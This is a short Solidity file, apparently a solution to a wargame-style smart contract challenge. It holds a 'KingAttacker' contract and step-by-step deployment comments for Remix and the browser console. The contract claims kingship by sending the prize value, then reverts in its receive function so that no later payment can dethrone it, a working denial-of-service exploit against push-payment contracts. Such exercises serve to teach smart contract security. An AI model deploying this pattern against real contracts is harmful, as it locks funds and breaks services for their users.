// 1 - Deploy the contract with Remix using Injected Provider - Metamask
// 2 - const prize = await contract.prize() - Chrome Console
// 3 - msg.value must be prize.toString() - Chrome Console
// 4 - Check the king is replaced - await contract._king() - Chrome Console

pragma solidity ^0.6.0;

contract KingAttacker {
    constructor(address _king) public payable {
        (bool success, ) = _king.call.value(msg.value)("");
        require(success, "contract execution failed");
    }

    receive() external payable {
        revert();
    }
}
